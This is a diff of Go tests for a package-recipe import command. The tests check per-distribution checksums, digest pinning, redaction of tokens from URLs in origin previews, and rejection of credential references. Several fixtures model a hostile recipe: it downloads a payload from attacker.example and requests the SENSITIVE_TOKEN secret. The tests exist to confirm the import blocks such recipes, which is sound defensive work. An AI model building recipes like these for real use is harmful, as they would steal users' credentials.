@@ -136,6 +136,85 @@ github = { repo = "owner/tool", asset = "tool.tar.gz", scope = "user" }
 	}
 }
 
+// Every host-compatible distribution must inherit or declare its own checksum.
+// A checksum on one sibling must never satisfy another sibling's integrity floor.
+func TestImportRejectsPartiallyChecksummedDistributions(t *testing.T) {
+	catalog := t.TempDir()
+	body := fmt.Sprintf(`recipe_version = 1
+
+[packages.tool.github]
+repo = "owner/tool"
+asset = "tool-{os_any}.tar.gz"
+scope = "user"
+
+[[packages.tool.github.distributions]]
+when = { os = ["linux"] }
+checksum = %q
+
+[[packages.tool.github.distributions]]
+when = { os = ["darwin"] }
+`, importTestChecksum)
+	source := writeImportSource(t, "tool", body)
+
+	code, out := runImportForTest(t, source, catalog, false, false)
+	if code != 2 || !strings.Contains(out, "distributions[1]") || !strings.Contains(out, "declares no checksum") {
+		t.Fatalf("unprotected distribution was accepted: exit=%d output=\n%s", code, out)
+	}
+	if _, err := os.Stat(filepath.Join(catalog, "tool.toml")); !os.IsNotExist(err) {
+		t.Fatalf("insecure import wrote a recipe: %v", err)
+	}
+}
+
+func TestImportAcceptsChecksumInheritedByAllDistributions(t *testing.T) {
+	catalog := t.TempDir()
+	body := fmt.Sprintf(`recipe_version = 1
+
+[packages.tool.github]
+repo = "owner/tool"
+asset = "tool-{os_any}.tar.gz"
+scope = "user"
+checksum = %q
+
+[[packages.tool.github.distributions]]
+when = { os = ["linux"] }
+
+[[packages.tool.github.distributions]]
+when = { os = ["darwin"] }
+`, importTestChecksum)
+	source := writeImportSource(t, "tool", body)
+
+	code, out := runImportForTest(t, source, catalog, true, false)
+	if code != 0 || !strings.Contains(out, "integrity:  github: "+importTestChecksum) {
+		t.Fatalf("valid checksum inheritance was rejected: exit=%d output=\n%s", code, out)
+	}
+}
+
+func TestImportWarnsWhenAnyDistributionUsesAutoChecksum(t *testing.T) {
+	catalog := t.TempDir()
+	body := fmt.Sprintf(`recipe_version = 1
+
+[packages.tool.github]
+repo = "owner/tool"
+asset = "tool-{os_any}.tar.gz"
+scope = "user"
+
+[[packages.tool.github.distributions]]
+when = { os = ["linux"] }
+checksum = %q
+
+[[packages.tool.github.distributions]]
+when = { os = ["darwin"] }
+checksum = "sha256:auto"
+checksum_url = "https://example.test/SHA256SUMS"
+`, importTestChecksum)
+	source := writeImportSource(t, "tool", body)
+
+	code, out := runImportForTest(t, source, catalog, true, false)
+	if code != 0 || !strings.Contains(out, "TOFU") || !strings.Contains(out, importTestChecksum) {
+		t.Fatalf("auto checksum in a distribution must warn: exit=%d output=\n%s", code, out)
+	}
+}
+
 func TestImportFlagsAutoChecksumAsTOFU(t *testing.T) {
 	catalog := t.TempDir()
 	body := `recipe_version = 1
@@ -438,7 +517,7 @@ func TestImportAcceptsDistributionChecksums(t *testing.T) {
 	}
 }
 
-func TestImportAcceptsChecksumSecretReference(t *testing.T) {
+func TestImportRejectsChecksumSecretReference(t *testing.T) {
 	tool := &config.Tool{Name: "tool", Methods: []*config.MethodCandidate{{
 		Kind:              "http",
 		Config:            map[string]any{"url": "https://example.test/tool.tar.gz", "checksum_url": "https://example.test/SHA256SUMS"},
@@ -448,8 +527,8 @@ func TestImportAcceptsChecksumSecretReference(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	if len(report.Errors) != 0 {
-		t.Fatalf("checksum secret must satisfy the floor: %v", report.Errors)
+	if len(report.Errors) == 0 || !strings.Contains(strings.Join(report.Errors, "; "), "checksum_secret_ref credential reference") {
+		t.Fatalf("checksum secret in a shared recipe must be rejected: %v", report.Errors)
 	}
 	if len(report.Candidates) != 1 || report.Candidates[0].Integrity != "checksum from secret reference" {
 		t.Fatalf("integrity = %#v", report.Candidates)
@@ -487,5 +566,171 @@ when = { os = ["darwin"] }
 	}
 	if !strings.Contains(out, `github "github_linux"`) || !strings.Contains(out, `github "github_darwin"`) {
 		t.Fatalf("candidate preview lost host-gated candidates:\n%s", out)
+	}
+}
+
+func TestImportPreviewListsAllDeclaredNetworkOrigins(t *testing.T) {
+	catalog := t.TempDir()
+	source := writeImportSource(t, "tool", `recipe_version = 1
+
+[packages.tool.native]
+pkg = "tool"
+sources = [
+  { kind = "brew-tap", name = "official/tools", url = "https://official.example/tools.git" },
+  { kind = "brew-tap", name = "extra/tools", url = "https://extra.example/tools.git" },
+]
+`)
+	code, out, stderr := executeImportForTest(t, source, catalog, "--dry-run", "--json")
+	if code != 0 || stderr != "" {
+		t.Fatalf("import preview: exit=%d, stderr=%q, out=%q", code, stderr, out)
+	}
+	for _, origin := range []string{"https://official.example", "https://extra.example"} {
+		if !strings.Contains(out, origin) {
+			t.Fatalf("preview omitted %q: %s", origin, out)
+		}
+	}
+}
+
+func TestImportPreviewListsChecksumSidecarOrigins(t *testing.T) {
+	catalog := t.TempDir()
+	source := writeImportSource(t, "tool", `recipe_version = 1
+
+[packages.tool.github]
+repo = "trusted/tool"
+asset = "tool-{os_any}.tar.gz"
+scope = "user"
+checksum = "sha256:auto"
+checksum_url = "https://checksum.example/SHA256SUMS"
+
+[[packages.tool.github.distributions]]
+when = { os = ["linux"] }
+checksum_url = "https://linux-checksum.example/SHA256SUMS"
+
+[[packages.tool.github.distributions]]
+when = { os = ["darwin"] }
+checksum_url = "https://mac-checksum.example/SHA256SUMS"
+`)
+	code, out, stderr := executeImportForTest(t, source, catalog, "--dry-run", "--json")
+	if code != 0 || stderr != "" {
+		t.Fatalf("import preview: exit=%d, stderr=%q, out=%q", code, stderr, out)
+	}
+	for _, origin := range []string{"github:trusted/tool", "https://checksum.example", "https://linux-checksum.example", "https://mac-checksum.example"} {
+		if !strings.Contains(out, origin) {
+			t.Fatalf("preview omitted %q: %s", origin, out)
+		}
+	}
+}
+
+func TestImportExpectedDigestRequiresTrustedMatch(t *testing.T) {
+	catalog := t.TempDir()
+	const body = "recipe_version = 1\n\n[packages.tool]\nnative = \"tool\"\n"
+	source := writeImportSource(t, "tool", body)
+	digest, err := config.CanonicalRecipeDigest([]byte(body))
+	if err != nil {
+		t.Fatal(err)
+	}
+	wrongDigest := "sha256:" + strings.Repeat("0", 64)
+	code, out, stderr := executeImportForTest(t, source, catalog, "--expected-digest="+wrongDigest, "--json")
+	if code != 2 || !strings.Contains(stderr, "digest mismatch") {
+		t.Fatalf("untrusted digest accepted or wrong diagnostic: code=%d stdout=%s stderr=%s", code, out, stderr)
+	}
+	if _, err := os.Stat(filepath.Join(catalog, "tool.toml")); !os.IsNotExist(err) {
+		t.Fatalf("digest mismatch wrote recipe: %v", err)
+	}
+	code, out, stderr = executeImportForTest(t, source, catalog, "--expected-digest="+digest, "--json")
+	if code != 0 || stderr != "" || importJSONData(t, out).Outcome != "written" {
+		t.Fatalf("matching digest rejected: code=%d stdout=%s stderr=%s", code, out, stderr)
+	}
+}
+
+func TestImportExpectedDigestRejectsMalformedPin(t *testing.T) {
+	source := writeImportSource(t, "tool", "recipe_version = 1\n[packages.tool]\nnative = \"tool\"\n")
+	code, out, stderr := executeImportForTest(t, source, t.TempDir(), "--expected-digest=sha256:abc", "--json")
+	if code != 2 || !strings.Contains(stderr, "expected-digest") || !strings.Contains(stderr, "64") {
+		t.Fatalf("malformed digest accepted or wrong diagnostic: code=%d stdout=%s stderr=%s", code, out, stderr)
+	}
+}
+
+func TestImportPreviewIncludesExplicitRegistryAndSourceSelectors(t *testing.T) {
+	method := &config.MethodCandidate{Kind: "npm", Config: map[string]any{
+		"registry": "https://registry.example/private?token=do-not-log",
+		"source":   "https://alternate.example/path?token=do-not-log",
+	}}
+	origins := strings.Join(importCandidateOrigins(method), " | ")
+	for _, origin := range []string{"registry @ https://registry.example", "source @ https://alternate.example"} {
+		if !strings.Contains(origins, origin) {
+			t.Fatalf("origin %q missing: %q", origin, origins)
+		}
+	}
+	if strings.Contains(origins, "do-not-log") {
+		t.Fatalf("origins leaked URL query: %q", origins)
+	}
+}
+
+func TestImportPreviewIncludesDistributionSignatureOrigins(t *testing.T) {
+	method := &config.MethodCandidate{Kind: "github", Config: map[string]any{
+		"repo":          "trusted/tool",
+		"signature_url": "https://signatures.example/sig?token=do-not-log",
+	}, Distributions: []config.Distribution{{
+		HasSignatureURL: true,
+		SignatureURL:    "https://platform-signatures.example/sig?token=do-not-log",
+	}}}
+	origins := strings.Join(importCandidateOrigins(method), " | ")
+	for _, origin := range []string{"signature_url @ https://signatures.example", "distributions[0] signature_url @ https://platform-signatures.example"} {
+		if !strings.Contains(origins, origin) {
+			t.Fatalf("origin %q missing: %q", origin, origins)
+		}
+	}
+	if strings.Contains(origins, "do-not-log") {
+		t.Fatalf("origins leaked URL query: %q", origins)
+	}
+}
+
+func TestImportExpectedDigestRejectsExplicitEmptyPin(t *testing.T) {
+	source := writeImportSource(t, "tool", "recipe_version = 1\n[packages.tool]\nnative = \"tool\"\n")
+	code, out, stderr := executeImportForTest(t, source, t.TempDir(), "--expected-digest=", "--json")
+	if code != 2 || !strings.Contains(stderr, "expected-digest") || importJSONData(t, out).Outcome != "rejected" {
+		t.Fatalf("empty pin accepted: exit=%d out=%q stderr=%q", code, out, stderr)
+	}
+}
+
+func TestImportRejectsCredentialReferencesInUntrustedRecipe(t *testing.T) {
+	cases := []struct {
+		field string
+		extra string
+	}{
+		{"secret_ref", fmt.Sprintf("checksum = %q\n", importTestChecksum)},
+		{"checksum_secret_ref", "checksum = \"sha256:auto\"\nchecksum_url = \"https://attacker.example/SHA256SUMS\"\n"},
+		{"signature_secret_ref", "checksum = \"sha256:auto\"\nsignature_url = \"https://attacker.example/signature\"\nsigning_key = \"release-key\"\n"},
+	}
+	for _, tt := range cases {
+		t.Run(tt.field, func(t *testing.T) {
+			catalog := t.TempDir()
+			body := fmt.Sprintf("recipe_version = 1\n\n[packages.tool.http]\nurl = \"https://attacker.example/payload.tar.gz\"\n%s%s = { provider = \"env\", name = \"SENSITIVE_TOKEN\" }\n", tt.extra, tt.field)
+			source := writeImportSource(t, "tool", body)
+			code, out := runImportForTest(t, source, catalog, false, false)
+			if code != 2 || !strings.Contains(out, tt.field+" credential reference") {
+				t.Fatalf("catalog recipe credential request was accepted: exit=%d output=%q", code, out)
+			}
+			if _, err := os.Stat(filepath.Join(catalog, "tool.toml")); !os.IsNotExist(err) {
+				t.Fatalf("credential-bearing recipe was imported: %v", err)
+			}
+		})
+	}
+}
+
+func TestImportRejectsSourceCredentialReferences(t *testing.T) {
+	tool := &config.Tool{Name: "tool", Methods: []*config.MethodCandidate{{
+		Kind: "native", Config: map[string]any{"pkg": "tool"}, Sources: []config.Source{{
+			Kind: "brew-tap", Name: "attacker/tools", URL: "https://attacker.example/repo.git",
+			SecretRef: &config.SecretReference{Provider: "env", Name: "SENSITIVE_TOKEN"},
+		}},
+	}}}
+	report, err := inspectImportRecipe("tool.toml", "tool", tool, []byte("recipe_version = 1\n"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !strings.Contains(strings.Join(report.Errors, " | "), "sources[0] secret_ref credential reference") {
+		t.Fatalf("source credential reference accepted: %+v", report)
 	}
 }
